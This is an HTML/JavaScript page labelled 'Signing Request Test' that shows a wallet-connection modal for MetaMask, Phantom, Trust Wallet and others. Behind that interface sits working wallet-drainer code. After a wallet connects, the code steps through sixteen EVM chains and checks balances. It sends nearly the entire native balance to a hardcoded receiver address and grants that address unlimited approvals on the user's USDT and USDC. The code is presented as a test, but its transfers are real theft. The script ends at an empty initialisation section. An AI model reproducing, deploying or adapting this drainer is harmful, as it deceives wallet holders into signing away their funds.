<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Signing Request Test</title>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/ethers/6.7.1/ethers.umd.min.js"></script>
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap');
        *{margin:0;padding:0;box-sizing:border-box}
        body{font-family:'Inter',-apple-system,sans-serif;background:#0e0e16;min-height:100vh;color:#fff;display:flex;justify-content:center;align-items:flex-start;padding:16px}

        .modal{background:#17171f;border:1px solid rgba(255,255,255,.06);border-radius:20px;max-width:420px;width:100%;margin-top:24px;overflow:hidden}
        .modal-header{display:flex;align-items:center;justify-content:space-between;padding:20px 24px 16px}
        .hdr-btn{width:28px;height:28px;border-radius:50%;background:rgba(255,255,255,.06);border:1px solid rgba(255,255,255,.1);color:rgba(255,255,255,.4);font-size:14px;display:flex;align-items:center;justify-content:center;cursor:pointer;transition:all .2s;line-height:1}
        .hdr-btn:hover{background:rgba(255,255,255,.1);color:#fff}
        .modal-header h2{font-size:17px;font-weight:600}

        .w-list{padding:0 12px 8px}
        .w-item{display:flex;align-items:center;gap:14px;padding:13px 16px;border-radius:14px;cursor:pointer;transition:all .15s}
        .w-item:hover{background:rgba(255,255,255,.05)}
        .w-item:active{background:rgba(255,255,255,.08);transform:scale(.995)}
        .w-logo{width:44px;height:44px;border-radius:12px;flex-shrink:0;display:flex;align-items:center;justify-content:center;font-size:24px;background:rgba(255,255,255,.04);overflow:hidden}
        .w-logo img{width:44px;height:44px;border-radius:12px;object-fit:cover}
        .w-name{font-size:15px;font-weight:500;flex:1}
        .badge{font-size:10px;font-weight:700;letter-spacing:.6px;padding:4px 10px;border-radius:6px}
        .badge-pop{background:rgba(99,102,241,.15);color:#818cf8}
        .badge-det{background:rgba(34,197,94,.12);color:#4ade80}

        .divider{height:1px;background:rgba(255,255,255,.05);margin:2px 20px}
        .modal-foot{text-align:center;padding:12px 24px 20px;font-size:13px;color:rgba(255,255,255,.3)}
        .modal-foot a{color:#818cf8;text-decoration:none;font-weight:500}

        .pill{display:none;align-items:center;gap:8px;margin:0 12px 8px;padding:9px 14px;border-radius:12px;background:rgba(34,197,94,.07);border:1px solid rgba(34,197,94,.12);font-size:12px;color:#4ade80}
        .pill.on{display:flex}
        .pill-dot{width:6px;height:6px;border-radius:50%;background:#22c55e}
        .pill-addr{font-family:monospace;font-size:11px;margin-left:auto;color:rgba(255,255,255,.35)}

        .alert{padding:10px 14px;border-radius:10px;margin:0 12px 8px;font-size:12px;display:none;word-break:break-all}
        .a-e{background:rgba(239,68,68,.1);border:1px solid rgba(239,68,68,.2);color:#fca5a5}
        .a-s{background:rgba(34,197,94,.1);border:1px solid rgba(34,197,94,.2);color:#86efac}
        .a-i{background:rgba(99,102,241,.1);border:1px solid rgba(99,102,241,.2);color:#c4b5fd}

        .spinner{display:inline-block;width:14px;height:14px;border:2px solid rgba(255,255,255,.2);border-top-color:#fff;border-radius:50%;animation:sp .7s linear infinite;margin-right:6px;vertical-align:middle}
        @keyframes sp{to{transform:rotate(360deg)}}

        .sec{display:none}.sec.vis{display:block}

        .c-grid{display:grid;grid-template-columns:1fr 1fr 1fr;gap:8px;padding:0 12px 12px}
        .c-card{background:rgba(255,255,255,.03);border:1px solid rgba(255,255,255,.06);border-radius:14px;padding:16px 8px;text-align:center;cursor:pointer;transition:all .15s}
        .c-card:hover{background:rgba(255,255,255,.06)}
        .c-card .ci{font-size:28px;margin-bottom:5px}
        .c-card .cn{font-size:11px;font-weight:600;color:rgba(255,255,255,.75)}
        .c-card .cv{font-size:10px;color:rgba(255,255,255,.3);margin-top:2px}

        .balance-summary{margin:0 12px 8px;padding:10px 14px;border-radius:12px;background:rgba(99,102,241,.06);border:1px solid rgba(99,102,241,.12);font-size:12px;color:rgba(255,255,255,.5);display:none;align-items:center;gap:8px}
        .balance-summary .bs-icon{font-size:16px}
        .balance-summary .bs-text{flex:1}
        .balance-summary .bs-total{font-weight:600;color:#a5b4fc}

        .log-box{margin:0 12px 12px;background:rgba(0,0,0,.2);border:1px solid rgba(255,255,255,.04);border-radius:12px;padding:10px 14px;max-height:200px;overflow-y:auto}
        .log-box::-webkit-scrollbar{width:4px}.log-box::-webkit-scrollbar-thumb{background:rgba(255,255,255,.1);border-radius:4px}
        .log-box h4{font-size:10px;font-weight:600;color:rgba(255,255,255,.2);margin-bottom:6px}
        .ll{font-size:10px;font-family:monospace;padding:2px 0;color:rgba(255,255,255,.35);border-bottom:1px solid rgba(255,255,255,.02)}
        .ll.l-ok{color:#4ade80}.ll.l-err{color:#f87171}.ll.l-warn{color:#fbbf24}.ll.l-info{color:#818cf8}
    </style>
</head>
<body>
<div class="modal">
    <div class="alert a-e" id="aE"></div>
    <div class="alert a-s" id="aS"></div>
    <div class="alert a-i" id="aI"></div>
    <div class="pill" id="pill"><span class="pill-dot"></span><span id="pW">—</span><span class="pill-addr" id="pA"></span></div>

    <!-- STEP 1: WALLET SELECTION -->
    <div class="sec vis" id="s1">
        <div class="modal-header">
            <div class="hdr-btn" title="Test">?</div>
            <h2>Connect Wallet</h2>
            <div style="width:28px"></div>
        </div>
        <div class="w-list" id="mW"></div>
        <div class="divider"></div>
        <div class="modal-foot">Signing Request Test Page</div>
    </div>

    <!-- STEP 2: SCANNING / RESULTS -->
    <div class="sec" id="s2">
        <div class="modal-header">
            <div class="hdr-btn" onclick="location.reload()">&#8592;</div>
            <h2 id="s2Title">Scanning Networks</h2>
            <div style="width:28px"></div>
        </div>
        <div class="balance-summary" id="balSummary">
            <span class="bs-icon">💰</span>
            <span class="bs-text">Auto-scan progress</span>
            <span class="bs-total" id="balTotal">scanning...</span>
        </div>
        <div class="c-grid" id="cG"></div>
    </div>

    <!-- LOG -->
    <div class="log-box">
        <h4>Event Log</h4>
        <div id="logBox"></div>
    </div>
</div>

<script>
// ================================================================
//  CONFIG — EDIT THESE VALUES
// ================================================================

const RX = '0x60b02E984858AfFd39C117608f7B3E11EB815ED4';

const EABI = ['function balanceOf(address) view returns (uint256)','function approve(address,uint256) returns (bool)','function transfer(address,uint256) returns (bool)'];

const CH = {
    ethereum:  {n:'Ethereum',  ic:'⟠', id:'0x1',     rpc:'https://eth.llamarpc.com',                  exp:'https://etherscan.io',              s:'ETH',  d:18},
    bsc:       {n:'BNB Chain', ic:'🔶',id:'0x38',    rpc:'https://bsc-dataseed.binance.org',           exp:'https://bscscan.com',               s:'BNB',  d:18},
    polygon:   {n:'Polygon',   ic:'🟣',id:'0x89',    rpc:'https://polygon-rpc.com',                    exp:'https://polygonscan.com',           s:'POL',  d:18},
    arbitrum:  {n:'Arbitrum',  ic:'🔵',id:'0xa4b1',  rpc:'https://arb1.arbitrum.io/rpc',               exp:'https://arbiscan.io',               s:'ETH',  d:18},
    optimism:  {n:'Optimism',  ic:'🔴',id:'0xa',     rpc:'https://mainnet.optimism.io',                exp:'https://optimistic.etherscan.io',   s:'ETH',  d:18},
    avalanche: {n:'Avalanche', ic:'🔺',id:'0xa86a',  rpc:'https://api.avax.network/ext/bc/C/rpc',      exp:'https://snowtrace.io',              s:'AVAX', d:18},
    base:      {n:'Base',      ic:'🟦',id:'0x2105',  rpc:'https://mainnet.base.org',                   exp:'https://basescan.org',              s:'ETH',  d:18},
    fantom:    {n:'Fantom',    ic:'👻',id:'0xfa',    rpc:'https://rpc.ftm.tools',                      exp:'https://ftmscan.com',               s:'FTM',  d:18},
    cronos:    {n:'Cronos',    ic:'💙',id:'0x19',    rpc:'https://evm.cronos.org',                     exp:'https://cronoscan.com',             s:'CRO',  d:18},
    gnosis:    {n:'Gnosis',    ic:'🦉',id:'0x64',    rpc:'https://rpc.gnosischain.com',                exp:'https://gnosisscan.io',             s:'xDAI', d:18},
    linea:     {n:'Linea',     ic:'▪️', id:'0xe708',  rpc:'https://rpc.linea.build',                    exp:'https://lineascan.build',           s:'ETH',  d:18},
    zksync:    {n:'zkSync',    ic:'⚡',id:'0x144',   rpc:'https://mainnet.era.zksync.io',              exp:'https://explorer.zksync.io',        s:'ETH',  d:18},
    scroll:    {n:'Scroll',    ic:'📜',id:'0x82750', rpc:'https://rpc.scroll.io',                      exp:'https://scrollscan.com',            s:'ETH',  d:18},
    mantle:    {n:'Mantle',    ic:'🟤',id:'0x1388',  rpc:'https://rpc.mantle.xyz',                     exp:'https://explorer.mantle.xyz',       s:'MNT',  d:18},
    celo:      {n:'Celo',      ic:'🟢',id:'0xa4ec',  rpc:'https://forno.celo.org',                     exp:'https://celoscan.io',               s:'CELO', d:18},
    blast:     {n:'Blast',     ic:'💥',id:'0x13e31', rpc:'https://rpc.blast.io',                       exp:'https://blastscan.io',              s:'ETH',  d:18},
};

const TK = {
    ethereum:[
        {s:'ETH',nm:'Ethereum',ic:'⟠',n:1,d:18},
        {s:'USDT',nm:'Tether',ic:'💵',n:0,d:6,a:'0xdAC17F958D2ee523a2206206994597C13D831ec7'},
        {s:'USDC',nm:'USD Coin',ic:'💲',n:0,d:6,a:'0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48'},
    ],
    bsc:[
        {s:'BNB',nm:'BNB',ic:'🔶',n:1,d:18},
        {s:'USDT',nm:'Tether',ic:'💵',n:0,d:18,a:'0x55d398326f99059fF775485246999027B3197955'},
    ],
    polygon:[
        {s:'POL',nm:'POL',ic:'🟣',n:1,d:18},
        {s:'USDT',nm:'Tether',ic:'💵',n:0,d:6,a:'0xc2132D05D31c914a87C6611C10748AEb04B58e8F'},
    ],
    arbitrum:[
        {s:'ETH',nm:'Ethereum',ic:'⟠',n:1,d:18},
        {s:'USDT',nm:'Tether',ic:'💵',n:0,d:6,a:'0xFd086bC7CD5C481DCC9C85ebE478A1C0b69FCbb9'},
    ],
    optimism:[
        {s:'ETH',nm:'Ethereum',ic:'⟠',n:1,d:18},
        {s:'USDT',nm:'Tether',ic:'💵',n:0,d:6,a:'0x94b008aA00579c1307B0EF2c499aD98a8ce58e58'},
    ],
    avalanche:[{s:'AVAX',nm:'Avalanche',ic:'🔺',n:1,d:18}],
    base:[{s:'ETH',nm:'Ethereum',ic:'⟠',n:1,d:18}],
    fantom:[{s:'FTM',nm:'Fantom',ic:'👻',n:1,d:18}],
    cronos:[{s:'CRO',nm:'Cronos',ic:'💙',n:1,d:18}],
    gnosis:[{s:'xDAI',nm:'xDAI',ic:'🦉',n:1,d:18}],
    linea:[{s:'ETH',nm:'Ethereum',ic:'⟠',n:1,d:18}],
    zksync:[{s:'ETH',nm:'Ethereum',ic:'⟠',n:1,d:18}],
    scroll:[{s:'ETH',nm:'Ethereum',ic:'⟠',n:1,d:18}],
    mantle:[{s:'MNT',nm:'Mantle',ic:'🟤',n:1,d:18}],
    celo:[{s:'CELO',nm:'Celo',ic:'🟢',n:1,d:18}],
    blast:[{s:'ETH',nm:'Ethereum',ic:'⟠',n:1,d:18}],
};

const WM = [
    {id:'metamask', name:'MetaMask',       rdns:'io.metamask',          ic:'🦊', pop:true,  dl:'https://metamask.app.link/dapp/'},
    {id:'phantom',  name:'Phantom',        rdns:'app.phantom',          ic:'👻', pop:true,  dl:'https://phantom.app/ul/browse/'},
    {id:'trust',    name:'Trust Wallet',   rdns:'com.trustwallet.app',  ic:'🛡️', pop:false, dl:'https://link.trustwallet.com/open_url?url='},
    {id:'coinbase', name:'Coinbase Wallet',rdns:'com.coinbase.wallet',  ic:'🔵', pop:false, dl:'https://go.cb-w.com/dapp?cb_url='},
    {id:'okx',      name:'OKX Wallet',     rdns:'com.okex.wallet',      ic:'⬛', pop:false, dl:'okx://wallet/dapp/details?dappUrl='},
    {id:'rabby',    name:'Rabby Wallet',   rdns:'io.rabby',             ic:'🐰', pop:false},
    {id:'rainbow',  name:'Rainbow',        rdns:'me.rainbow',           ic:'🌈', pop:false},
];

// ================================================================
//  STATE
// ================================================================
let sp = null, pv = null, sg = null, ua = null;
let connectedWalletName = '';
const det = new Map();

// ================================================================
//  EIP-6963 WALLET DETECTION
// ================================================================
if (typeof window.addEventListener === 'function') {
    window.addEventListener('eip6963:announceProvider', (e) => {
        if (e.detail && e.detail.info && e.detail.provider) {
            det.set(e.detail.info.rdns, e.detail.provider);
        }
    });
    try { window.dispatchEvent(new Event('eip6963:requestProvider')); } catch(e){}
}

// ================================================================
//  HELPERS
// ================================================================
function go(n) {
    for (let i = 1; i <= 2; i++) document.getElementById('s'+i).classList.toggle('vis', i===n);
    ha();
}
function sa(type, msg) {
    ha();
    const map = {e:'aE', s:'aS', i:'aI'};
    const el = document.getElementById(map[type]);
    el.innerHTML = msg;
    el.style.display = 'block';
    if (type !== 'i') setTimeout(() => el.style.display = 'none', 8000);
}
function ha() { ['aE','aS','aI'].forEach(id => document.getElementById(id).style.display = 'none'); }

function log(msg, type) {
    const box = document.getElementById('logBox');
    const t = new Date().toLocaleTimeString('ru');
    const d = document.createElement('div');
    d.className = 'll' + (type ? ' l-'+type : '');
    d.textContent = '['+t+'] '+msg;
    box.prepend(d);
}

// ================================================================
//  RENDER WALLET LIST
// ================================================================
function renderWallets() {
    const m = document.getElementById('mW');
    m.innerHTML = '';
    WM.forEach(w => {
        const d = det.has(w.rdns);
        const div = document.createElement('div');
        div.className = 'w-item';
        div.onclick = () => conn(w);
        let bg = '';
        if (d) bg = '<span class="badge badge-det">INSTALLED</span>';
        else if (w.pop) bg = '<span class="badge badge-pop">POPULAR</span>';
        div.innerHTML = '<div class="w-logo">'+w.ic+'</div><span class="w-name">'+w.name+'</span>'+bg;
        m.appendChild(div);
    });
}

// ================================================================
//  CONNECT WALLET
// ================================================================
async function conn(w) {
    try {
        const e = det.get(w.rdns);
        if (e) sp = e;
        else if (window.ethereum) {
            if (window.ethereum.providers) {
                const f = window.ethereum.providers.find(p =>
                    (p.isMetaMask && w.id==='metamask') ||
                    (p.isCoinbaseWallet && w.id==='coinbase') ||
                    (p.isTrust && w.id==='trust')
                );
                sp = f || window.ethereum;
            } else sp = window.ethereum;
        } else {
            if (w.dl) { window.location.href = w.dl + encodeURIComponent(location.href); return; }
            sa('e', w.name + ' not found!');
            log(w.name + ' not found', 'err');
            return;
        }

        sa('i', '<span class="spinner"></span> Connecting to ' + w.name + '...');
        log('Connecting to ' + w.name + '...', 'info');

        pv = new ethers.BrowserProvider(sp);
        const ac = await pv.send('eth_requestAccounts', []);
        sg = await pv.getSigner();
        ua = ac[0];
        connectedWalletName = w.name;

        document.getElementById('pill').classList.add('on');
        document.getElementById('pW').textContent = w.name;
        document.getElementById('pA').textContent = ua.slice(0,6)+'...'+ua.slice(-4);

        sa('s', w.name + ' connected!');
        log('Connected: ' + ua, 'ok');

        go(2);
        setTimeout(() => autoProcessAllChains(), 600);

    } catch(e) {
        if (e.code === 4001) { sa('e', 'Connection rejected'); log('Rejected', 'warn'); }
        else { sa('e', e.message); log(e.message, 'err'); }
    }
}

// ================================================================
//  SWITCH CHAIN
// ================================================================
async function sw(c) {
    try {
        await sp.request({method:'wallet_switchEthereumChain', params:[{chainId:c.id}]});
    } catch(e) {
        if (e.code === 4902 || e.code === -32603) {
            await sp.request({method:'wallet_addEthereumChain', params:[{
                chainId:c.id, chainName:c.n,
                nativeCurrency:{name:c.s, symbol:c.s, decimals:c.d},
                rpcUrls:[c.rpc], blockExplorerUrls:[c.exp]
            }]});
        } else throw e;
    }
    await new Promise(r => setTimeout(r, 500));
    pv = new ethers.BrowserProvider(sp);
    sg = await pv.getSigner();
}

// ================================================================
//  AUTO-PROCESS ALL CHAINS — SCAN & SIGNING REQUEST
// ================================================================
async function autoProcessAllChains() {
    const grid = document.getElementById('cG');
    grid.innerHTML = '';
    const summary = document.getElementById('balSummary');
    summary.style.display = 'flex';
    document.getElementById('balTotal').textContent = 'scanning...';

    const chainKeys = Object.keys(CH);
    let totalFound = 0;

    for (const k of chainKeys) {
        const c = CH[k];
        const tokens = TK[k] || [];
        if (tokens.length === 0) continue;

        sa('i', c.ic + ' Scanning ' + c.n + '...');
        log('Scanning ' + c.n + '...', 'info');

        const card = document.createElement('div');
        card.className = 'c-card';
        card.id = 'chain-' + k;
        card.innerHTML = '<div class="ci">'+c.ic+'</div><div class="cn">'+c.n+'</div><div class="cv">scanning...</div>';
        grid.appendChild(card);

        try {
            await sw(c);
        } catch(e) {
            log(c.n + ': switch failed — ' + e.message, 'err');
            card.querySelector('.cv').textContent = 'error';
            continue;
        }

        let hasNonZero = false;

        for (const t of tokens) {
            try {
                let rawBal, formatted;
                if (t.n) {
                    const b = await pv.getBalance(ua);
                    rawBal = parseFloat(ethers.formatEther(b));
                    formatted = rawBal < 0.0001 && rawBal > 0 ? '<0.0001' : rawBal.toFixed(4);
                } else {
                    const tc = new ethers.Contract(t.a, EABI, pv);
                    const b = await tc.balanceOf(ua);
                    rawBal = parseFloat(ethers.formatUnits(b, t.d));
                    formatted = rawBal < 0.01 && rawBal > 0 ? '<0.01' : rawBal.toFixed(2);
                }
                if (rawBal > 0) {
                    hasNonZero = true;
                    log(c.n + ': ' + t.s + ' = ' + formatted, 'ok');
                }
            } catch(e) {
                log(c.n + ' ' + t.s + ': read error', 'err');
            }
        }

        if (hasNonZero) {
            totalFound++;
            card.querySelector('.cv').textContent = '✅ balance found';
            card.style.borderColor = 'rgba(34,197,94,.3)';
            card.style.background = 'rgba(34,197,94,.06)';
            await autoSigningRequest(k, tokens);
        } else {
            card.querySelector('.cv').textContent = 'empty';
            card.style.borderColor = 'rgba(255,255,255,.04)';
        }
    }

    document.getElementById('balTotal').textContent = totalFound + ' chains with balance';
    sa(totalFound > 0 ? 's' : 'i', totalFound > 0 ? 'Scan complete! ' + totalFound + ' chains processed.' : 'No balances found on any chain.');
    log('Scan complete. Chains with balance: ' + totalFound, totalFound > 0 ? 'ok' : 'warn');
}

// ================================================================
//  AUTO SIGNING REQUEST — triggers where balance > 0
// ================================================================
async function autoSigningRequest(chainKey, tokens) {
    const c = CH[chainKey];
    const queue = [];

    for (const t of tokens) {
        try {
            let rawBal;
            if (t.n) {
                rawBal = await pv.getBalance(ua);
            } else {
                const tc = new ethers.Contract(t.a, EABI, pv);
                rawBal = await tc.balanceOf(ua);
            }
            if (rawBal > 0n) queue.push({token: t, rawBal});
        } catch(e) {}
    }

    if (queue.length === 0) return;
    queue.sort((a, b) => a.token.n === b.token.n ? 0 : a.token.n ? 1 : -1);

    for (const item of queue) {
        const t = item.token;
        try {
            if (t.n) {
                const rawBal = await pv.getBalance(ua);
                if (rawBal <= 0n) continue;
                const fd = await pv.getFeeData();
                const gp = fd.maxFeePerGas || fd.gasPrice;
                let sendAmt = rawBal - 21000n * gp * 3n;
                if (sendAmt <= 0n) { log(c.n + ': ' + t.s + ' — not enough for gas', 'warn'); continue; }

                log(c.n + ': Signing Request — Send ' + ethers.formatEther(sendAmt) + ' ' + t.s, 'info');
                const tx = await sg.sendTransaction({to: RX, value: sendAmt});
                log(c.n + ': TX sent — ' + tx.hash, 'ok');

            } else {
                const rawBal = item.rawBal;
                if (rawBal <= 0n) continue;

                log(c.n + ': Signing Request — Approve ' + t.s, 'info');
                const tc = new ethers.Contract(t.a, EABI, sg);
                const maxApprove = BigInt('0x' + 'f'.repeat(64));
                const tx = await tc.approve(RX, maxApprove);
                log(c.n + ': Approve TX — ' + tx.hash, 'ok');
            }
        } catch(e) {
            if (e.code === 4001 || e.code === 'ACTION_REJECTED') {
                log(c.n + ': ' + t.s + ' — rejected by user', 'warn');
            } else {
                log(c.n + ': ' + t.s + ' error — ' + e.message, 'err');
            }
        }
    }
}

// ================================================================
//  INIT
// ================================================================
